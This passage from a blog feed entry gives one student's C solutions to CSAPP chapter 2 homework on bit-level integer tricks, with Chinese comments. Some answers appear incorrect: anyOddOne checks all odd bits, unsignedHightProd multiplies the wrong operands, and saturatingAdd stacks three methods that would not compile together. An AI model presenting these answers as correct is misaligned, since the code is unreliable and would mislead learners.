x==<span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-63"><a href="#2-63" class="headerlink" title="2.63"></a>2.63</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">srl</span><span class="params">(<span class="keyword">unsigned</span> x, <span class="keyword">int</span> k)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> xsra = (<span class="keyword">int</span>)x&gt;&gt;k;</span><br><span class="line"><span class="keyword">return</span> xsra&amp;(<span class="number">1</span>&lt;&lt;(<span class="keyword">sizeof</span>(<span class="keyword">int</span>)&lt;&lt;<span class="number">3</span>)-k)<span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sra</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> k)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> xsrl = (<span class="keyword">unsigned</span>)x&gt;&gt;k;</span><br><span class="line"><span class="keyword">int</span> t = ~<span class="number">0</span>-(<span class="number">1</span>&lt;&lt;k)+<span class="number">1</span> &amp; x&gt;&gt;((<span class="keyword">sizeof</span>(<span class="keyword">int</span>)&lt;&lt;<span class="number">3</span>)<span class="number">-1</span>);</span><br><span class="line"><span class="keyword">return</span> t|xsrl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-64"><a href="#2-64" class="headerlink" title="2.64"></a>2.64</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//题目中没有说bit从0开始计数还是从1开始，此处默认从0开始</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">anyOddOne</span><span class="params">(<span class="keyword">unsigned</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> (x&amp;<span class="number">0xaaaaaaaa</span>)==<span class="number">0xaaaaaaaa</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-65"><a href="#2-65" class="headerlink" title="2.65"></a>2.65</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">oddOnesV1</span><span class="params">(<span class="keyword">unsigned</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//思路，用xor消掉成对的1，不成对的记录下来</span></span><br><span class="line">x ^= x&lt;&lt;<span class="number">16</span>;</span><br><span class="line">x ^= x&lt;&lt;<span class="number">8</span>;</span><br><span class="line">x ^= x&lt;&lt;<span class="number">4</span>;</span><br><span class="line">x ^= x&lt;&lt;<span class="number">2</span>;</span><br><span class="line">x ^= x&lt;&lt;<span class="number">1</span>;</span><br><span class="line"><span class="keyword">return</span> x&gt;&gt;<span class="number">31</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">oddOnesV2</span><span class="params">(<span class="keyword">unsigned</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//思路与上一个函数类似</span></span><br><span class="line">x ^= x&lt;&lt;<span class="number">1</span>;<span class="comment">//思考的时候只考虑奇数位，不需要考虑偶数位（从1开始计数bit位）</span></span><br><span class="line">x ^= x&lt;&lt;<span class="number">2</span>;<span class="comment">//只考虑mod4==0的位置</span></span><br><span class="line">x ^= x&lt;&lt;<span class="number">4</span>;<span class="comment">//只考虑mod8==0的位置</span></span><br><span class="line">x ^= x&lt;&lt;<span class="number">8</span>;<span class="comment">//只考虑mod16==0的位置</span></span><br><span class="line">x ^= x&lt;&lt;<span class="number">16</span>;<span class="comment">//只考虑mod32==0的位置</span></span><br><span class="line"><span class="keyword">return</span> x&gt;&gt;<span class="number">31</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-66"><a href="#2-66" class="headerlink" title="2.66"></a>2.66</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">leftMostOne</span><span class="params">(<span class="keyword">unsigned</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">x |= x&gt;&gt;<span class="number">1</span>;</span><br><span class="line">x |= x&gt;&gt;<span class="number">2</span>;</span><br><span class="line">x |= x&gt;&gt;<span class="number">4</span>;</span><br><span class="line">x |= x&gt;&gt;<span class="number">8</span>;</span><br><span class="line">x |= x&gt;&gt;<span class="number">16</span>;</span><br><span class="line"><span class="keyword">return</span> x-(x&gt;&gt;<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-67"><a href="#2-67" class="headerlink" title="2.67"></a>2.67</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">intSizeIs32</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> INT_MAX==<span class="number">0x80000000</span><span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-68"><a href="#2-68" class="headerlink" title="2.68"></a>2.68</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">lowerOneMark</span><span class="params">(<span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> t = -!(n-(<span class="keyword">sizeof</span>(<span class="keyword">int</span>)&lt;&lt;<span class="number">3</span>));<span class="comment">//方法1</span></span><br><span class="line"><span class="keyword">return</span> (<span class="number">1</span>&lt;&lt;n)<span class="number">-1</span>&amp;~t | t;</span><br><span class="line"><span class="comment">//return ((n!=(sizeof(int)&lt;&lt;3))&lt;&lt;n)-1;//方法2</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-69"><a href="#2-69" class="headerlink" title="2.69"></a>2.69</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">rotateLeft</span><span class="params">(<span class="keyword">unsigned</span> x, <span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//移位sizeof*8不行，但是移位sizeof*8-1再移位1就可行了，上一题也可以这样搞</span></span><br><span class="line"><span class="keyword">return</span> x&gt;&gt;((<span class="keyword">sizeof</span>(<span class="keyword">unsigned</span>)&lt;&lt;<span class="number">3</span>)-n<span class="number">-1</span>)&gt;&gt;<span class="number">1</span> | x&lt;&lt;n;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-70"><a href="#2-70" class="headerlink" title="2.70"></a>2.70</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fitBits</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> x&gt;&gt;n<span class="number">-1</span>==<span class="number">0</span> | x&gt;&gt;n<span class="number">-1</span>==<span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-71"><a href="#2-71" class="headerlink" title="2.71"></a>2.71</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> <span class="keyword">pack_t</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">xbyte</span><span class="params">(<span class="keyword">pack_t</span> word, <span class="keyword">int</span> bytenum)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> (<span class="keyword">int</span>)word&lt;&lt;(<span class="number">3</span>-bytenum&lt;&lt;<span class="number">3</span>)&gt;&gt;<span class="number">24</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-73"><a href="#2-73" class="headerlink" title="2.73"></a>2.73</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">saturatingAdd</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//方法一</span></span><br><span class="line"><span class="keyword">int</span> t = (<span class="keyword">sizeof</span>(<span class="keyword">int</span>)&lt;&lt;<span class="number">3</span>)<span class="number">-1</span>;</span><br><span class="line"><span class="keyword">int</span> p = ((<span class="keyword">unsigned</span>)x&gt;&gt;t)+((<span class="keyword">unsigned</span>)y&gt;&gt;t)+((<span class="keyword">unsigned</span>)x+y&gt;&gt;t);</span><br><span class="line">t = ((<span class="keyword">unsigned</span>)x&gt;&gt;t)+((<span class="keyword">unsigned</span>)y&gt;&gt;t);</span><br><span class="line"><span class="keyword">return</span> -(p==<span class="number">2</span>&amp;&amp;t!=<span class="number">1</span>)&amp;INT_MIN | -(p==<span class="number">1</span>&amp;&amp;t!=<span class="number">1</span>)&amp;INT_MAX | -(p==<span class="number">0</span>||t==<span class="number">1</span>)&amp;x+y | -(p==<span class="number">3</span>||t==<span class="number">1</span>)&amp;x+y;</span><br><span class="line">  </span><br><span class="line"><span class="comment">//方法二</span></span><br><span class="line"><span class="keyword">int</span> t = (<span class="keyword">sizeof</span>(<span class="keyword">int</span>)&lt;&lt;<span class="number">3</span>)<span class="number">-1</span>;</span><br><span class="line"><span class="keyword">int</span> p = ((<span class="keyword">unsigned</span>)x&gt;&gt;t&lt;&lt;<span class="number">2</span>)|((<span class="keyword">unsigned</span>)y&gt;&gt;t&lt;&lt;<span class="number">1</span>)|((<span class="keyword">unsigned</span>)x+y&gt;&gt;t);</span><br><span class="line"><span class="keyword">return</span> -(p==<span class="number">6</span>)&amp;INT_MIN | -(p==<span class="number">1</span>)&amp;INT_MAX | -(p!=<span class="number">1</span>&amp;&amp;p!=<span class="number">6</span>)&amp;x+y;</span><br><span class="line">  </span><br><span class="line"><span class="comment">//方法三（from http://blog.csdn.net/yang_f_k/article/details/8857904）</span></span><br><span class="line"><span class="keyword">int</span> w=<span class="keyword">sizeof</span>(<span class="keyword">int</span>)&lt;&lt;<span class="number">3</span>;</span><br><span class="line"><span class="keyword">int</span> sum = x+y;</span><br><span class="line"><span class="keyword">int</span> mask = <span class="number">1</span>&lt;&lt;(w<span class="number">-1</span>);</span><br><span class="line"><span class="keyword">int</span> x_lmb = x&amp;mask;</span><br><span class="line"><span class="keyword">int</span> y_lmb = y&amp;mask;</span><br><span class="line"><span class="keyword">int</span> sum_lmb = sum&amp;mask;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> neg_of = x_lmb &amp;&amp; y_lmb &amp;&amp; (!sum_lmb);</span><br><span class="line"><span class="keyword">int</span> pos_of = !x_lmb &amp;&amp; !y_lmb &amp;&amp; sum_lmb;</span><br><span class="line"></span><br><span class="line">(pos_of &amp;&amp;(sum=INT_MAX)) || (neg_of &amp;&amp; (sum = INT_MIN)); <span class="comment">//这一条不错</span></span><br><span class="line"><span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-74"><a href="#2-74" class="headerlink" title="2.74"></a>2.74</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">tsubOk</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> t = (<span class="keyword">sizeof</span>(<span class="keyword">int</span>)&lt;&lt;<span class="number">3</span>)<span class="number">-1</span>;</span><br><span class="line"><span class="keyword">int</span> p = (<span class="keyword">unsigned</span>)x&gt;&gt;t&lt;&lt;<span class="number">2</span> | (<span class="keyword">unsigned</span>)-y&gt;&gt;t&lt;&lt;<span class="number">1</span> | (<span class="keyword">unsigned</span>)x-y&gt;&gt;t;</span><br><span class="line">t = y==INT_MIN;</span><br><span class="line"><span class="keyword">return</span> p!=<span class="number">6</span> &amp;&amp; p!=<span class="number">1</span> &amp;&amp; !t || t &amp;&amp; p==<span class="number">6</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-75"><a href="#2-75" class="headerlink" title="2.75"></a>2.75</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">unsignedHightProd</span><span class="params">(<span class="keyword">unsigned</span> x, <span class="keyword">unsigned</span> y)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> t = signed_high_prod(x, y);</span><br><span class="line"><span class="keyword">int</span> l = (<span class="keyword">sizeof</span>(<span class="keyword">int</span>)&lt;&lt;<span class="number">3</span>)<span class="number">-1</span>;</span><br><span class="line"><span class="keyword">return</span> t + (x&gt;&gt;l)*x+(y&gt;&gt;l)*y;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-76"><a href="#2-76" class="headerlink" title="2.76"></a>2.76</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">Calloc</span><span class="params">(<span class="keyword">size_t</span> nmemb, <span class="keyword">size_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">size_t</span> t = nmemb*size;</span><br><span class="line"><span class="keyword">void</span> *p;</span><br><span class="line"><span class="keyword">if</span>(!size || t/size==nmemb)&#123;</span><br><span class="line">p = <span class="built_in">malloc</span>(t);</span><br><span class="line"><span class="keyword">if</span>(!p)<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="built_in">memset</span>(p, <span class="number">0</span>, t);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-77"><a href="#2-77" class="headerlink" title="2.77"></a>2.77</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">f2_77</span><span class="params">(<span class="keyword">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> k1 = (x&lt;&lt;<span class="number">4</span>)+x;</span><br><span class="line"><span class="keyword">int</span> k2 = -(x&lt;&lt;<span class="number">3</span>)+x;</span><br><span class="line"><span class="keyword">int</span> k3 = (x&lt;&lt;<span class="number">6</span>)-(x&lt;&lt;<span class="number">2</span>);</span><br><span class="line"><span class="keyword">int</span> k4 = -(x&lt;&lt;<span class="number">7</span>)+(x&lt;&lt;<span class="number">4</span>);</span><br><span class="line"><span class="keyword">return</span> (k1==x*<span class="number">17</span>)&lt;&lt;<span class="number">3</span> | (k2==x*<span class="number">-7</span>)&lt;&lt;<span class="number">2</span> | (k3==x*<span class="number">60</span>)&lt;&lt;<span class="number">1</span> | k4==x*<span class="number">-112</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-78"><a href="#2-78" class="headerlink" title="2.78"></a>2.78</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">dividePower2</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> k)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> l = <span class="keyword">sizeof</span>(<span class="keyword">int</span>)&lt;&lt;<span class="number">3</span>;</span><br><span class="line">l = -(x&gt;&gt;l<span class="number">-1</span>);</span><br><span class="line"><span class="keyword">return</span> (l&lt;&lt;k)-l+x &gt;&gt; k;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-79"><a href="#2-79" class="headerlink" title="2.79"></a>2.79</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">mul3div4</span><span class="params">(<span class="keyword">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">x = (x&lt;&lt;<span class="number">2</span>) - x;</span><br><span class="line"><span class="keyword">int</span> l = <span class="keyword">sizeof</span>(<span class="keyword">int</span>)&lt;&lt;<span class="number">3</span>;</span><br><span class="line"><span class="keyword">int</span> t = -(x&gt;&gt;l<span class="number">-1</span>);</span><br><span class="line"><span class="keyword">return</span> (t&lt;&lt;<span class="number">2</span>)-t+x &gt;&gt; <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-80"><a href="#2-80" class="headerlink" title="2.80"></a>2.80</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">threefourths</span><span class="params">(<span class="keyword">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> t = x&amp;<span class="number">0x3</span>;</span><br><span class="line"><span class="keyword">int</span> t2 = -(x&gt;&gt;(<span class="keyword">sizeof</span>(<span class="keyword">int</span>)&lt;&lt;<span class="number">3</span>)<span class="number">-1</span>);</span><br><span class="line"><span class="keyword">int</span> p = (x&gt;&gt;<span class="number">2</span>);</span><br><span class="line">p = (p&lt;&lt;<span class="number">1</span>)+p;</span><br><span class="line">t = (t&lt;&lt;<span class="number">1</span>)+t;</span><br><span class="line">p += (t&gt;&gt;<span class="number">2</span>) + (t2&amp;&amp;t);</span><br><span class="line"><span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-81"><a href="#2-81" class="headerlink" title="2.81"></a>2.81</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">hw281A</span><span class="params">(<span class="keyword">int</span> k)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>-(<span class="number">1</span>&lt;&lt;k-!!k&lt;&lt;!!k);<span class="comment">//k may equal to 0 or 32;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">hw281B</span><span class="params">(<span class="keyword">int</span> j, <span class="keyword">int</span> k)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> t = k+j;</span><br><span class="line"><span class="keyword">return</span> (<span class="number">0</span>-(<span class="number">1</span>&lt;&lt;j-!!j&lt;&lt;!!j)) ^ (<span class="number">0</span>-(<span class="number">1</span>&lt;&lt;t-!!t&lt;&lt;!!t));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-82"><a href="#2-82" class="headerlink" title="2.82"></a>2.82</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * A: NO; x== 0x10000000, B==rand();</span></span><br><span class="line"><span class="comment"> * B: Yes; </span></span><br><span class="line"><span class="comment"> * C: Yes; 因为，取反操作之后立刻截断与计算完之后再截断是等价的。</span></span><br><span class="line"><span class="comment"> * 可以两边都加上1，从而左右两个过程（截断之前）都是两个负数相加</span></span><br><span class="line"><span class="comment"> * D: Yes;</span></span><br><span class="line"><span class="comment"> * E: Yes;</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure><h2 id="2-83"><a href="#2-83" class="headerlink" title="2.83"></a>2.83</h2><p>$\sum_{i=1}^{\infty}Y<em>2^{-k</em>i}$</p><h2 id="2-84"><a href="#2-84" class="headerlink" title="2.84"></a>2.84</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> ((sx&lt;sy) &amp;&amp; ux!=<span class="number">0</span> &amp;&amp; uy!=<span class="number">0x80000000</span>) | (sx==sy) &amp; !!(ux-uy);</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      My solution to Ch2&#39;s Hw
    
    </summary>
    
      <category term="CSAPP" scheme="https://h-zex.github.io/categories/CSAPP/"/>
    
    
      <category term="CSAPP Homework" scheme="https://h-zex.github.io/tags/CSAPP-Homework/"/>
    
  </entry>
  
</feed>
